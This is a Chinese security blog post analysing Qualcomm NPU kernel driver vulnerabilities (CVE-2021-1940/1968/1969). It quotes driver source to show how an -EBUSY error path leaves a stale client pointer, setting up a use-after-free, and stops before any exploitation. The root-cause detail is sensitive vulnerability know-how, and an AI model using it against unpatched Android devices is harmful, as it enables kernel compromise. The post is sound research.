<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="robots" content="noindex"><meta><title>Tag: android - buffer0verflooow - Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="buffer0verflooow - Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="buffer0verflooow - Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta property="og:type" content="blog"><meta property="og:title" content="buffer0verflooow - Blog"><meta property="og:url" content="https://buffer0verflooow.github.io/"><meta property="og:site_name" content="buffer0verflooow - Blog"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://buffer0verflooow.github.io/img/og_image.png"><meta property="article:author" content="buffer0verflooow"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://buffer0verflooow.github.io/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://buffer0verflooow.github.io"},"headline":"buffer0verflooow - Blog","image":["https://buffer0verflooow.github.io/img/og_image.png"],"author":{"@type":"Person","name":"buffer0verflooow"},"publisher":{"@type":"Organization","name":"buffer0verflooow - Blog","logo":{"@type":"ImageObject","url":"https://buffer0verflooow.github.io/img/logo.svg"}},"description":""}</script><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="buffer0verflooow - Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><div class="card-content"><nav class="breadcrumb" aria-label="breadcrumbs"><ul><li><a href="/tags">Tags</a></li><li class="is-active"><a href="#" aria-current="page">android</a></li></ul></nav></div></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-05-14T13:38:53.000Z" title="2022/5/14 21:38:53">2022-05-14</time></span><span class="level-item">Updated&nbsp;<time dateTime="2023-01-01T02:21:57.263Z" title="2023/1/1 10:21:57">2023-01-01</time></span><span class="level-item">an hour read (About 6964 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/05/14/Qualcomm-NPU-%E9%A9%B1%E5%8A%A8%E6%BC%8F%E6%B4%9E-CVE-2021-1940-CVE-2021-1968-CVE-2021-1969/">Qualcomm NPU 驱动漏洞(CVE-2021-1940,CVE-2021-1968,CVE-2021-1969)</a></p><div class="content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前看过华为NPU的漏洞，也整理过NPU逆向的文章，这个漏洞后来也刷到了，但是当时应该是没精力看，就放在文件夹里了。最近又重新看到它，感觉NPU漏洞还是很有意思的，就梳理一下。</p>
<h1 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h1><h2 id="NPU"><a href="#NPU" class="headerlink" title="NPU"></a>NPU</h2><p>目前移动领域在应用AI计算的时候，有两种方式：一是采用独立的 NPU 芯片；二是，通过CPU、GPU 和 DSP 处理器的协作（异构计算），将不同的 AI 计算需求分配到移动平台中不同的部分，最终高效且快速地完成 AI 计算任务。</p>
<p>目前，高通是采用的第二种方法，也就是Kryo CPU、Adreno GPU 和 Hexagon 处理器，第一款声称支持 AI 计算的芯片是骁龙660，实际在架构上应该更早。</p>
<blockquote>
<p>⚠️ 第一种方式有三个问题：</p>
<ol>
<li>能耗；</li>
<li>处理 AI 任务时，NPU 与 CPU 之间的交互速度；</li>
<li>新的 NPU 架构对旧的神经网络的兼容性。</li>
</ol>
</blockquote>
<p>后文还是采用高通 NPU 的说法来表示高通芯片的 AI 计算的支持。</p>
<h2 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h2><p>由于 NPU 内核驱动是在 4.14 中引入的，因此，只有内核版本 4.14 或更高版本的手机才会受到影响。还有一点，Pixel 设备虽然也有自己的AI处理单元（edge TPU），但内核驱动程序需要 root 权限才能使用，因此这些漏洞影响不了 Pixel 设备。</p>
<p>在公布这三个漏洞的细节时（2021年11月18日），对三星 NPU 设备的驱动程序的访问受到限制，但采用高通芯片组的设备，仍然可以从不受信任的应用程序中访问高通 NPU 驱动程序。</p>
<h2 id="内核驱动程序"><a href="#内核驱动程序" class="headerlink" title="内核驱动程序"></a>内核驱动程序</h2><p>先来看看源码的位置：<code>drivers/media/platform/msm/npu</code>，除了与NPU的初始化和关闭有关的各种任务外，它主要负责在 CPU 和 NPU 之间发送 RPC 消息，以及分配共享内存以访问神经网络模型、数据和结果。</p>
<p>该驱动可以通过打开<code>/dev/msm_npu</code>文件来进行交互。当设备驱动文件被打开时，将<a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_dev.c#1224">创建</a>一个<code>npu_client</code>对象。这个<code>npu_client</code>对象在这个文件的所有句柄被关闭后释放。</p>
<p>系统调用 <a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_dev.c#1744"><code>npu_ioctl</code></a> 表明了驱动所支持的操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">npu_ioctl</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd,</span></span><br><span class="line"><span class="params">						 <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> ret = -ENOIOCTLCMD;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">npu_client</span> *<span class="title">client</span> =</span> file-&gt;private_data;</span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> MSM_NPU_GET_INFO:</span><br><span class="line">		ret = npu_get_info(client, arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MSM_NPU_MAP_BUF:</span><br><span class="line">		ret = npu_map_buf(client, arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MSM_NPU_UNMAP_BUF:</span><br><span class="line">		ret = npu_unmap_buf(client, arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MSM_NPU_LOAD_NETWORK:</span><br><span class="line">		ret = npu_load_network(client, arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MSM_NPU_LOAD_NETWORK_V2:</span><br><span class="line">		ret = npu_load_network_v2(client, arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MSM_NPU_UNLOAD_NETWORK:</span><br><span class="line">		ret = npu_unload_network(client, arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MSM_NPU_EXEC_NETWORK:</span><br><span class="line">		ret = npu_exec_network(client, arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MSM_NPU_EXEC_NETWORK_V2:</span><br><span class="line">		ret = npu_exec_network_v2(client, arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MSM_NPU_RECEIVE_EVENT:</span><br><span class="line">		ret = npu_receive_event(client, arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MSM_NPU_SET_PROP:</span><br><span class="line">		ret = npu_set_property(client, arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> MSM_NPU_GET_PROP:</span><br><span class="line">		ret = npu_get_property(client, arg);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		pr_err(<span class="string">&quot;unexpected IOCTL %x\n&quot;</span>, cmd);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li><a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_dev.c#1291"><code>npu_map_buf</code></a>：使用<a target="_blank" rel="noopener" href="https://lwn.net/Articles/480055/">ION allocator</a>分配一个与 NPU 共享的直接内存访问（DMA）缓冲区。然后，这个共享内存可以用来将神经网络模型加载到 NPU 上。</li>
<li><a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_dev.c#1320"><code>npu_unmap_buf</code></a>：取消映射用<code>npu_map_buf</code>映射的共享内存。</li>
<li><a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_dev.c#1349"><code>npu_load_network(_v2)</code></a>：这两个 API，将神经网络模型加载到 NPU 上。模型数据被存储在使用<code>npu_map_buf</code>映射的共享内存区域。映射的缓冲区的细节需要提供给这个<code>ioctl</code>。这个<code>ioctl</code>将执行一些检查以确保缓冲区是有效的。NPU 内核驱动还将跟踪全局<code>npu_host_ctx</code>的<a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_mgr.h#92"><code>networks</code></a>阵列中加载的神经网络列表。</li>
<li><a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_dev.c#1440"><code>npu_unload_network(_v2)</code></a>：这两个API，用于从 NPU 中删除一个神经网络模型。这也将其从内核驱动中的<code>networks</code>数组中删除掉。</li>
<li><a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_dev.c#1470"><code>npu_exec_network(_v2)</code></a>：这两个 API，用于执行从<code>npu_load_network(_v2)</code>加载的神经网络模型。</li>
</ol>
<p>这些<code>ioctl</code>主要是对输入参数进行一些检查，然后将其重新打包成 RPC 包，并使用<a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_mgr.c#1127"><code>npu_send_network_cmd</code></a> 方法发送。这个方法然后调用<code>npu_host_ipc_send_cmd</code>方法，将 RPC 数据包发布到对应的消息队列：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">npu_send_network_cmd</span><span class="params">(<span class="keyword">struct</span> npu_device *npu_dev,</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> npu_network *network, <span class="type">void</span> *cmd_ptr, <span class="type">bool</span> async)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">		ret = npu_host_ipc_send_cmd(npu_dev,</span><br><span class="line">			IPC_QUEUE_APPS_EXEC, cmd_ptr);</span><br><span class="line">		<span class="keyword">if</span> (ret)</span><br><span class="line">			network-&gt;cmd_pending = <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这些消息将被 NPU 接收，以执行对应的动作。大多数命令是同步的，意味着内核驱动将发送 RPC ，然后等待 NPU 完成计算，并在<code>ioctl</code>调用完成前回复它。同时也支持异步：<code>npu_exec_network</code>，通过在<code>ioctl</code>参数中提供一个布尔参数<code>async</code>，这个<code>ioctl</code>可以在异步模式下执行，并在 RPC 消息发送完毕后立即返回给用户。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int32_t</span> <span class="title function_">npu_host_exec_network</span><span class="params">(<span class="keyword">struct</span> npu_client *client,</span></span><br><span class="line"><span class="params">			<span class="keyword">struct</span> msm_npu_exec_network_ioctl *exec_ioctl)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">bool</span> async_ioctl = !!exec_ioctl-&gt;async;</span><br><span class="line">    ...</span><br><span class="line">	ret = npu_send_network_cmd(npu_dev, network, &amp;exec_packet, async_ioctl);</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (async_ioctl) &#123;</span><br><span class="line">		pr_debug(<span class="string">&quot;Async ioctl, return now\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> exec_done;</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">	mutex_unlock(&amp;host_ctx-&gt;lock);</span><br><span class="line"></span><br><span class="line">	ret = wait_for_completion_interruptible_timeout(</span><br><span class="line">		&amp;network-&gt;cmd_done,</span><br><span class="line">		(host_ctx-&gt;fw_dbg_mode &amp; FW_DBG_MODE_INC_TIMEOUT) ?</span><br><span class="line">		NW_DEBUG_TIMEOUT : NW_CMD_TIMEOUT);</span><br><span class="line"></span><br><span class="line">	mutex_lock(&amp;host_ctx-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>异步模式可以使用<code>npu_receive_event</code>  <code>ioctl</code>在过段时间后再从 NPU 获取计算的结果。在命令完成后，NPU 将发送一个 RPC 到 CPU，然后由<a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_mgr.c#721"><code>app_msg_proc</code></a> 方法进行处理。</p>
<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>漏洞与<code>npu_exec_network</code>的异步模式有关：</p>
<ol>
<li>使用<code>npu_map_buf</code>映射 NPU 中的一些共享内存区域，并使用它来存储一个神经网络模型；</li>
<li>使用<code>npu_load_network</code> 将神经网络加载到 NPU 中；</li>
<li>使用<code>npu_exec_network</code>来执行带有<code>async</code>标志的神经网络。</li>
</ol>
<p>问题在于第二步，当神经网络被加载到 NPU 中时，内核驱动程序也会保留一个记录，这是通过 <a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_mgr.c#575"><code>alloc_network</code></a> 方法实现的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> npu_network *<span class="title function_">alloc_network</span><span class="params">(<span class="keyword">struct</span> npu_host_ctx *ctx,</span></span><br><span class="line"><span class="params">	<span class="keyword">struct</span> npu_client *client)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int32_t</span> i;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">npu_network</span> *<span class="title">network</span> =</span> ctx-&gt;networks;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_LOADED_NETWORK; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (network-&gt;id == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		network++;</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">	network-&gt;client = client;</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">return</span> network;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>network</code>不是动态分配的，实际上是全局变量<code>npu_host_ctx ctx</code>成员<code>networks</code>数组中的一个条目。<code>ctx</code>是由内核驱动的所有用户共享的，所以一次只能加载非常有限的网络。当一个<code>npu_network</code>被分配时，就将它的数据被保存在<code>networks</code>数组中，其<code>id</code>被返回给用户。<code>npu_network</code>也保存了加载它的用户的<code>npu_client</code>。</p>
<ol>
<li>为了区分<code>network</code>的使用者，以便每个用户只能访问自己的网络。当通过<code>network</code>的<code>id</code>获得一个<code>network</code>时，会检查<code>client</code>字段，以确保用户有权利访问该<code>network</code>。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> npu_network *<span class="title function_">get_network_by_hdl</span><span class="params">(<span class="keyword">struct</span> npu_host_ctx *ctx,</span></span><br><span class="line"><span class="params">     <span class="keyword">struct</span> npu_client *client, <span class="type">uint32_t</span> hdl)</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="type">int32_t</span> i;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">npu_network</span> *<span class="title">network</span> =</span> ctx-&gt;networks;</span><br><span class="line">     ...</span><br><span class="line">     <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_LOADED_NETWORK; i++) &#123;</span><br><span class="line">         <span class="keyword">if</span> (network-&gt;network_hdl == hdl)</span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         network++;</span><br><span class="line">     &#125;</span><br><span class="line">     ...</span><br><span class="line">     <span class="keyword">if</span> (client &amp;&amp; (client != network-&gt;client)) &#123;     <span class="comment">//&lt;-------- Check that client owns the network</span></span><br><span class="line">         pr_err(<span class="string">&quot;network %lld doesn&#x27;t belong to this client\n&quot;</span>,</span><br><span class="line">             network-&gt;id);</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     network_get(network);</span><br><span class="line">     <span class="keyword">return</span> network;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>当使用异步的<code>ioctl</code>调用时，当 NPU 回复时，要识别调用发起的用户。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">app_msg_proc</span><span class="params">(<span class="keyword">struct</span> npu_host_ctx *host_ctx, <span class="type">uint32_t</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> NPU_IPC_MSG_EXECUTE_DONE:</span><br><span class="line">    &#123;</span><br><span class="line">        ...</span><br><span class="line">        network = get_network_by_hdl(host_ctx, <span class="literal">NULL</span>,</span><br><span class="line">            exe_rsp_pkt-&gt;network_hdl);</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span> (!network-&gt;cmd_async) &#123;</span><br><span class="line">            complete(&amp;network-&gt;cmd_done);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            ...</span><br><span class="line">            <span class="keyword">if</span> (npu_queue_event(network-&gt;client, &amp;kevt))  <span class="comment">//&lt;------ queue the event to the client&#x27;s event queue</span></span><br><span class="line">                pr_err(<span class="string">&quot;queue npu event failed\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        network_put(network);</span><br></pre></td></tr></table></figure>

<p>由于上述处理来自 NPU 的消息的代码是在内核中运行的，它依赖于<code>npu_network</code>包含在消息中的<code>id</code>，以定位发起请求的用户，然后它将作为一个事件发送到客户端的事件队列中，提示它做出响应。</p>
<p>当然，由于<code>npu_network</code>是全局数据，当文件关闭和<code>npu_client</code>被释放时，必须进行适当的清理，将其从<code>npu_network</code>中删除，以避免UAF。这在<a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_dev.c#1243"><code>npu_host_cleanup_networks</code></a>中进行。当<code>npu_close</code>被调用时，该函数将用于查找存储该<code>npu_client</code>的<code>npu_network</code>，并尝试使用<a target="_blank" rel="noopener" href="https://android.googlesource.com/kernel/msm/+/60319ac47b3d30c81413fb0ebb9a21085a9a0be0/drivers/media/platform/msm/npu/npu_mgr.c#1653"><code>npu_host_unload_network</code></a>将其删除。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">npu_host_cleanup_networks</span><span class="params">(<span class="keyword">struct</span> npu_client *client)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_LOADED_NETWORK; i++) &#123;</span><br><span class="line">		network = &amp;host_ctx-&gt;networks[i];</span><br><span class="line">		<span class="keyword">if</span> (network-&gt;client == client) &#123;</span><br><span class="line">            ...</span><br><span class="line">			npu_host_unload_network(client, &amp;unload_req);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>npu_host_unload_network</code>使用<code>free_network</code>将<code>client</code>从<code>npu_network</code>中移除：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int32_t</span> <span class="title function_">npu_host_unload_network</span><span class="params">(<span class="keyword">struct</span> npu_client *client,</span></span><br><span class="line"><span class="params">			<span class="keyword">struct</span> msm_npu_unload_network_ioctl *unload)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">free_network:</span><br><span class="line">    ...</span><br><span class="line">	free_network(host_ctx, client, network-&gt;id); <span class="comment">//&lt;------ zero out npu_network, which removes client</span></span><br><span class="line">    ...</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是，不是所有的路径都能到达<code>free_network</code>，有很多都提前返回了，但有一条错误路径不同：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ret = npu_send_network_cmd(npu_dev, network, &amp;unload_packet, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">	pr_err(<span class="string">&quot;NPU_IPC_CMD_UNLOAD sent failed: %d\n&quot;</span>, ret);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If another command is running on this network,</span></span><br><span class="line"><span class="comment">	 * don&#x27;t free_network now.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (ret == -EBUSY) &#123;       <span class="comment">//&lt;----------- returns early and skip free_network</span></span><br><span class="line">		pr_err(<span class="string">&quot;Network is running, retry later\n&quot;</span>);</span><br><span class="line">		network_put(network);</span><br><span class="line">		mutex_unlock(&amp;host_ctx-&gt;lock);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">goto</span> free_network;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果 <code>npu_send_network_cmd</code> 出现了错误，并且错误为 <code>-EBUSY</code>，则 <code>free_network</code> 将被跳过，并且 <code>client</code> 不会被移除。这样就会出现两个问题：</p>
